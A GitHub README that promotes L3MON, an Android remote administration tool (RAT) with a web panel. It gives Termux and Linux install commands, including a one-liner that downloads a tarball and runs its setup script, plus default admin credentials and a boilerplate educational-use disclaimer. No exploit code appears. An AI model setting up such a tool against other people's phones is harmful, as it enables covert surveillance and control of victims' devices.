
# 🍋 L3MON - Android Remote Administration Tool

<div align="center">
  
  ### **Lightweight Android RAT with Web Panel**
  
  [![GitHub](https://img.shields.io/badge/GitHub-ERROR0101r-181717?style=for-the-badge&logo=github)](https://github.com/ERROR0101r)
  [![Telegram](https://img.shields.io/badge/Telegram-@ERROR0101risback-26A5E4?style=for-the-badge&logo=telegram)](https://t.me/ERROR0101risback)
  [![Instagram](https://img.shields.io/badge/Instagram-@fahad0101r-E4405F?style=for-the-badge&logo=instagram)](https://instagram.com/fahad0101r)
  
</div>

---

<div align="center">
  
| **CREATED BY ERROR** |
|----------------------|
| Developer: ERROR0101r / fahad0101r |
| GitHub: https://github.com/ERROR0101r |
| Telegram: https://t.me/ERROR0101risback |
| Instagram: https://instagram.com/fahad0101r |
  
</div>

---

## 📋 **TABLE OF CONTENTS**
- [What is L3MON?](#-what-is-l3mon)
- [Features](#-features)
- [Installation](#-installation)
  - [Termux Installation](#termux-installation)
  - [Linux Installation](#linux-installation)
- [Commands](#-commands)
- [Default Credentials](#-default-credentials)
- [Uninstallation](#-uninstallation)
- [Disclaimer](#-disclaimer)
- [Support](#-support)

---

## 🧐 **WHAT IS L3MON?**

L3MON is a powerful Android Remote Administration Tool (RAT) with a web-based control panel. It allows you to manage Android devices remotely through a simple and intuitive interface.

**No coding skills required** - Just run the setup and you're ready!

> **Developed by ERROR** - A tool built with precision and simplicity.

---

## ✨ **FEATURES**

- 📱 **Android Device Control** - Full remote access
- 🌐 **Web Panel** - Easy to use browser interface
- 🔐 **Secure Login** - Password protected admin panel
- 📊 **Real-time Updates** - Live device status
- 🎯 **User Friendly** - Simple setup process
- 🔄 **Cross Platform** - Works on Termux & Linux
- ⚡ **Lightweight** - Minimal resource usage
- 🔧 **Easy Setup** - One command installation

---

## 🚀 **INSTALLATION**

### Termux Installation

```bash
# Update packages
pkg update && pkg upgrade -y

# Install dependencies
pkg install wget tar nodejs yarn -y

# Download L3MON
wget https://github.com/ERROR0101r/L3MON/raw/main/L3MON.tar.gz

# Extract
tar -xzvf L3MON.tar.gz

# Navigate
cd L3MON

# Run setup
chmod +x setup.sh
./setup.sh
```

Linux Installation

```bash
# Update packages
sudo apt update && sudo apt upgrade -y

# Install dependencies
sudo apt install wget tar nodejs yarn -y

# Download L3MON
wget https://github.com/ERROR0101r/L3MON/raw/main/L3MON.tar.gz

# Extract
tar -xzvf L3MON.tar.gz

# Navigate
cd L3MON

# Run setup
chmod +x setup.sh
./setup.sh
```

Quick One-Liner (Termux):

```bash
pkg update && pkg upgrade -y && pkg install wget tar nodejs yarn -y && wget https://github.com/ERROR0101r/L3MON/raw/main/L3MON.tar.gz && tar -xzvf L3MON.tar.gz && cd L3MON && chmod +x setup.sh && ./setup.sh
```

---

⌨️ COMMANDS

Command Description
lemon Start the L3MON server
lemon-pass Change admin username/password

---

🔑 DEFAULT CREDENTIALS

Field Value
Username admin
Password admin

Change these immediately after installation!

---

🗑️ UNINSTALLATION

To completely remove L3MON from your device:

```bash
# Download uninstaller
wget https://github.com/ERROR0101r/L3MON/raw/main/uninstall.sh

# Make executable
chmod +x uninstall.sh

# Run
./uninstall.sh
```

Or manually:

```bash
# Remove installation
rm -rf /data/data/com.termux/files/usr/share/lemon

# Remove commands
rm -f $PREFIX/bin/lemon
rm -f $PREFIX/bin/lemon-pass

# Remove source (optional)
rm -rf ~/L3MON
```

---

⚠️ DISCLAIMER

IMPORTANT - PLEASE READ:

· 🔒 This tool is for educational purposes only
· 🚫 Do NOT use for illegal activities
· 👤 You are responsible for how you use this tool
· 📡 Only use on devices you own or have permission to access
· ⚖️ Misuse may violate laws in your country

By using this tool, you agree that the creator (ERROR) is NOT responsible for any misuse.

---

👨‍💻 SUPPORT

<div align="center">

Platform Handle
GitHub ERROR0101r
Telegram @ERROR0101risback
Instagram @fahad0101r

</div>

---

⭐ SHOW SUPPORT

· ⭐ Star this repository
· 📢 Share with your friends
· 🔔 Follow for updates

---

<div align="center">

🚀 Happy Hacking!

"With great power comes great responsibility"

---

🙏 THANK YOU

Developed with ❤️ by ERROR

GitHub: ERROR0101r

Telegram: @ERROR0101risback

Instagram: @fahad0101r

---

<sub>© 2026 L3MON by ERROR. All rights reserved.</sub>

</div>